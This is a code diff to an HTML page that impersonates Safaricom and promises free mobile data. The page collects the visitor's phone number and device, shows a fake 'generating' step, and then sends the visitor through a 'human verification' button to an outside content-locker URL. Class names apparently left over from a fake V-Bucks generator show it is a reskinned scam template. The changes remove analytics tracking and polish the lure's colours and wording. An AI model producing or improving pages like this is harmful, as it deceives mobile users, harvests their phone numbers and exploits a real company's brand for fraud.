@@ -24,23 +24,7 @@
         tracesSampleRate: 0.01
     });
 </script>
-<script>
-    (function (i, s, o, g, r, a, m) {
-        i['GoogleAnalyticsObject'] = r;
-        i[r] = i[r] || function () {
-            (i[r].q = i[r].q || []).push(arguments)
-        }, i[r].l = 1 * new Date();
-        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
-        a.async = 1;
-        a.src = g;
-        m.parentNode.insertBefore(a, m)
-    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
 
-
-    ga('create', 'UA-231689389-1', 'auto');
-    ga('send', 'pageview');
-
-</script>
 
 
     <style>
@@ -100,12 +84,12 @@ body{
     padding: 0;
     color: black;
     background-size: 100%;
-    background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(0, #b1ebae), color-stop(100%, #e2e1e1));
-    background-image: -webkit-linear-gradient(135deg, #b1ebae, #e2e1e1);
-    background-image: -moz-linear-gradient(45deg, #b1ebae, #e2e1e1);
-    background-image: -ms-linear-gradient(45deg, #b1ebae 0, #e2e1e1 100%);
-    background-image: -o-linear-gradient(45deg, #b1ebae, #e2e1e1);
-    background-image: linear-gradient(135deg, #b1ebae, #e2e1e1);
+    background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(0, #2a9124), color-stop(100%, #e2e1e1));
+    background-image: -webkit-linear-gradient(135deg, #2a9124, #e2e1e1);
+    background-image: -moz-linear-gradient(45deg, #2a9124, #e2e1e1);
+    background-image: -ms-linear-gradient(45deg, #2a9124 0, #e2e1e1 100%);
+    background-image: -o-linear-gradient(45deg, #2a9124, #e2e1e1);
+    background-image: linear-gradient(135deg, #2a9124, #e2e1e1);
 
 }
 
@@ -176,7 +160,7 @@ div{
     font-size: 1.75em;
     border-radius: 0.6em;
     border-width: 0.15em;
-    border-color: #b1ebae;
+    border-color: #2a9124;
     border-style: solid;
     font-weight: bold;
     box-sizing: border-box;
@@ -210,7 +194,7 @@ input, textarea{
 }
 
 .btn0 {
-    background: #b1ebae;
+    background: #2a9124;
     color: white;
     width: 30%;
     padding: 1em 0 1em 0;
@@ -228,11 +212,11 @@ input, textarea{
     background:#23941e;
     transform: scale(1.1);
     cursor: pointer;
-    box-shadow: 0 0 0.5em #b1ebae;
+    box-shadow: 0 0 0.5em #2a9124;
 }
 
 .btn1{
-    background: #b1ebae;
+    background: #2a9124;
     color: white;
     width: 33%;
     padding: 0.5em 0 0.5em 0;
@@ -247,10 +231,10 @@ input, textarea{
 
 .btn1:hover{
     background:whitesmoke;
-    color: #b1ebae;
+    color: #2a9124;
     transform: scale(1.1);
     cursor: pointer;
-    box-shadow: 0 0 0.5em #b1ebae;
+    box-shadow: 0 0 0.5em #2a9124;
 }
 
 @keyframes zoom-in-zoom-out {
@@ -288,7 +272,7 @@ input, textarea{
 .platform:hover{
     background:#FFFFFF;
     transform: scale(1.1);
-    box-shadow: 0 0 0.5em #b1ebae;
+    box-shadow: 0 0 0.5em #2a9124;
 
 }
 
@@ -415,13 +399,13 @@ input, textarea{
 .VBucks:hover{
     background:#FFFFFF;
     transform: scale(1.02);
-    box-shadow: 0 0 0.5em #b1ebae;
+    box-shadow: 0 0 0.5em #2a9124;
     cursor: pointer;
 }
 
 .Selected{
-    background: #b1ebae;
-    box-shadow: 0 0 0.5em #b1ebae;
+    background: #2a9124;
+    box-shadow: 0 0 0.5em #2a9124;
     color: #FFFFFF;
     border-radius: 1em;
     margin: 0.5em auto;
@@ -448,7 +432,7 @@ input, textarea{
     margin-left: -0.1em;
     width: 0;
     height: 1em;
-    background:#b1ebae;
+    background:#2a9124;
     border-radius: 0.5em;
 }
 .progressbar25{
@@ -729,9 +713,9 @@ input, textarea{
     <div class="main" id="main0" style="display: 1none;">
         <img src="https://www.gsma.com/get-involved/gsma-membership/wp-content/uploads/2014/06/Safaricom-Logo-152x43px-01.png" alt="DATA Logo" class="mainimg">
         <div class="step0" id="step0">
-            <div class="step0-txt"> Enter your phone number or Tell to Send Mobile DATA</div>
+            <div class="step0-txt"> Enter your phone number below</div>
             <div class="user-box" id="user-box">
-                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521063221bb696466af4g-data.pro 9a143142d50da47359338.png" class="user-icon">
+                <img src="https://static-00.iconduck.com/assets.00/phone-icon-1561x2048-qjhf7be8.png" class="user-icon">
                 <input class="user-input" id="input-id" placeholder="Phone number">
             </div>
             <div class="btn0" id="btn0id" onclick="firstmain0()">NEXT</div>
@@ -751,13 +735,13 @@ input, textarea{
         <div class="step0-txt"> Select your device</div>
         <div class="devices">
             <div class="platform selectedPlatform" id="platform0" onclick="device_click()">
-                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652106952d1b126420c2e61f86903a650c6b5059b.png" class="devices-pic android">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652106952d1b126420c2e61f86903a650c6b5059b.png" class="devices-pic android"> Android
             </div>
             <div class="platform" id="platform1" onclick="device_click()">
-                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/165210695181b32d93b95e48db0eb4b1c1015d7fd8.png" class="devices-pic ios">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/165210695181b32d93b95e48db0eb4b1c1015d7fd8.png" class="devices-pic ios"> ios
             </div>
             <div class="platform" id="platform2" onclick="device_click()">
-                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521069526685e8acc2881e9f06e23c7eb8a19e4c.png" class="devices-pic windows">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521069526685e8acc2881e9f06e23c7eb8a19e4c.png" class="devices-pic windows"> Windows
             </div>
         </div>
     </div>
@@ -780,7 +764,7 @@ input, textarea{
                 </div>
             </div>
         </div>
-        <div class="btn0" id="btn1id" onclick="GenerateButton()">Generate</div>
+        <div class="btn0" id="btn1id" onclick="GenerateButton()">GET DATA</div>
         <div class="search1" id="search1" style="display: none ;">
             <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652194594fea7175a707ceefbaa64e6857ffd6767.png" class="settings-rotate">
             <div class="step0-txt" id="Generating-step0">Getting Ready..</div>
@@ -794,7 +778,7 @@ input, textarea{
     <div class="main" id="main3" style="display: none;">
         <div class="laststep" id="laststep" style="display: 1none ;">
             <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652194619c7feb47a1add45dc53247b16cbcf8ab0.png" class="laststep-rotate">
-            <div class="LastStepTxt" id="LastStepTxt">Hello <span id="Name-LastStep" style="color: #b1ebae; font-weight: bold;"></span>! You are almost there. <br><br> To send <span id="vbucksamount" style="color: #b1ebae; font-weight: 900;"></span> DATA into your account complete the human verification. Click on the button to verify. </div>
+            <div class="LastStepTxt" id="LastStepTxt">Hello <span id="Name-LastStep" style="color: #2a9124; font-weight: bold;"></span>! You are almost there. <br><br> To send <span id="vbucksamount" style="color: #2a9124; font-weight: 900;"></span> DATA into your account complete the human verification. Click on the button to verify. </div>
             <div class="btn1 showContentLocker" id="btn2id" onclick="window.location.href='https://safaricom-ke.4g-data.pro/50GB';"> Verify </div>
         </div>
     </div>
